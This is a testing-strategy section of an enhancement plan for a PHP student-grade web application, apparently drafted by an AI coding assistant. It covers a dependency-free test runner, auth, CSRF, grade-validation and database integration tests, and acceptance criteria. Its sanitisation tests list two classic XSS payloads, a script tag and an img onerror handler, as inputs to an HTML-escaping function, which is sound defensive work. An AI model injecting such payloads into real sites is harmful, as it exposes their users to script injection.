## 5. Verification & Testing Strategy

### 5.1 Zero-Download Test Runner Architecture
To conform strictly with the user's Mandatory Download Permission Policy (no internet downloads, no Composer packages), a native, self-contained test runner will be constructed at `tests/run_tests.php`.

The test runner will be executed directly via the standard PHP 8.2 CLI binary:
```bash
/opt/lampp/bin/php tests/run_tests.php
```

#### Core Runner Features:
- **Zero External Dependencies**: Implemented in 100% native PHP 8.2.
- **Assertion Engine**: Provides descriptive assertions (`assertEquals`, `assertTrue`, `assertFalse`, `assertNull`, `assertContains`, `assertMatchesRegularExpression`, `expectException`).
- **Test Discovery**: Automatically discovers and executes all `*Test.php` files in `tests/unit/` and `tests/integration/`.
- **ANSI Terminal Output**: Colorized output with test name, pass/fail status, execution time, and detailed stack traces on assertion failure.
- **Exit Code Integration**: Returns exit code `0` on 100% success, and exit code `1` on any failure (suitable for CI/CD pipelines).

### 5.2 Unit Test Suites (`tests/unit/`)

#### 5.2.1 `AuthFunctionsTest.php`
- Tests `base_url()` resolution across root, subdirectory, and trailing slash configurations.
- Tests `isLoggedIn()` timeout expiration (1800-second session window).
- Tests `generateCsrfToken()` uniqueness and `verifyCsrfToken()` validation.
- Tests `requireRole()` JSON 401/403 emission when simulated in API mode.

#### 5.2.2 `SecuritySanitizationTest.php`
- Tests `escapeHtml()` logic against canonical XSS attack vectors:
  - `<script>alert('XSS')</script>` -> `&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;`
  - `<img src=x onerror=alert(1)>` -> `&lt;img src=x onerror=alert(1)&gt;`
  - Double quotes, single quotes, ampersands, and null/undefined handling.

#### 5.2.3 `GradeValidationTest.php`
- Tests numeric grade boundaries (`grade >= 0` and `grade <= 100`).
- Tests rejection of non-numeric, negative, and out-of-bound grade entries.
- Tests CSV row parsing and column validation.

#### 5.2.4 `CourseFunctionsTest.php`
- Tests query construction for course cohorts.
- Tests semester array integer sanitization (`intval` filtering).

### 5.3 Integration Test Suites (`tests/integration/`)

#### 5.3.1 `DatabaseSchemaTest.php`
- Verifies that table `coursework` enforces the `unique_student_course_assessment` constraint.
- Verifies that table `audit_logs` contains the `reason` column and that `action` is at least `VARCHAR(100)`.

#### 5.3.2 `UserRegistrationTest.php`
- Verifies that `public/signup.php` and `api/save_user.php` bind password hashes as strings.
- Asserts that newly inserted user rows have `password != '0'` and that `password_verify()` succeeds with the original plaintext password.

#### 5.3.3 `DuplicateGradeTest.php`
- Verifies that inserting an assessment for an existing `(student_id, course_id, assessment_type)` updates the existing row in place via `ON DUPLICATE KEY UPDATE` rather than creating a duplicate row.

#### 5.3.4 `DepartmentHeadSyncTest.php`
- Verifies that provisioning a Department Head atomically assigns `users.department_id` and `departments.head_id`.

### 5.4 Quality Gate & Acceptance Criteria

| Check | Tool / Command | Pass Criteria |
|---|---|---|
| **PHP Syntax** | `/opt/lampp/bin/php -l [file]` | 100% of PHP files pass with 0 syntax errors |
| **Test Suite Execution** | `/opt/lampp/bin/php tests/run_tests.php` | 100% tests pass, 0 failures, 0 errors, exit code 0 |
| **Password Integrity** | Integration Test | Bcrypt hashes preserved; zero accounts with password `'0'` |
| **Grade Integrity** | Integration Test | 0 duplicate coursework entries; unique constraint active |
| **XSS Immunization** | Static Analysis / Code Review | 100% of dynamic `innerHTML` interpolations escaped |
| **Git Structure** | `git log --oneline` | Clean atomic commits matching proposed milestone roadmap |

---

*End of Enhancement Plan. Proceed to Milestone M1 upon approval.*
